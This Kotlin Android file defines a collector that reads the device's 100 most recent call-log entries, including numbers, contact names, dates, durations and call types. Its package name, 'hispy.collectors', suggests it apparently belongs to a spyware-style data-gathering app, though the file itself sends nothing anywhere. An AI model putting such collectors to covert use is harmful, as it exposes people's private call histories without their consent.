package com.ufc.hispy.collectors

import android.content.Context
import android.provider.CallLog
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

data class CallLogEntry(
    val id: String,
    val number: String,
    val name: String?,
    val date: Long,
    val duration: Int,
    val type: Int
)

class CallLogsCollector(private val context: Context) {
    
    suspend fun collectCallLogs(): List<CallLogEntry> = withContext(Dispatchers.IO) {
        val logs = mutableListOf<CallLogEntry>()
        
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
            ),
            null,
            null,
            CallLog.Calls.DATE + " DESC LIMIT 100"
        )
        
        cursor?.use {
            val idIndex = it.getColumnIndex(CallLog.Calls._ID)
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
            
            while (it.moveToNext()) {
                logs.add(CallLogEntry(
                    id = it.getString(idIndex),
                    number = it.getString(numberIndex),
                    name = it.getString(nameIndex),
                    date = it.getLong(dateIndex),
                    duration = it.getInt(durationIndex),
                    type = it.getInt(typeIndex)
                ))
            }
        }
        
        return@withContext logs
    }
}